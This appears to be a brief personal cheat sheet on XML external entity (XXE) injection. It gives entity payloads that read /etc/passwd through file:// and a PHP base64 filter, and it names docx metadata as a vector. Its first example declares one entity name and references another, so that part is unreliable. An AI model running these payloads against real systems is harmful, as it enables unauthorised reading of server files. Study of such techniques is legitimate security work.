When the site loads untrusted XML, can be used to read files.
## XML entities
XML allows setting entities, which are aliases that can be used everywhere, using this syntax:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo[
    <!ENTITY flag "asd">
]>
<test>
	&asd;xyz
</test>
```
equivalent to `asdxyz` inside `<test>`.
Note that if the entity value contains a tag, it will be parsed as a tag after expansion (untested)
## Reading files
XML entities allows reading files using the following entity syntax:
`<!ENTITY flag SYSTEM "file:///etc/passwd">`.
Now `&flag;` will be the content of `/etc/passwd`.`
If the file contains tags, this technique can be used to base64 encode the content: `php://filter/convert.base64-encode/resource=file:///etc/passwd`
## Unusual Vectors
- parsing fields such as author of docx files can be an XXE vector as they are saved in xml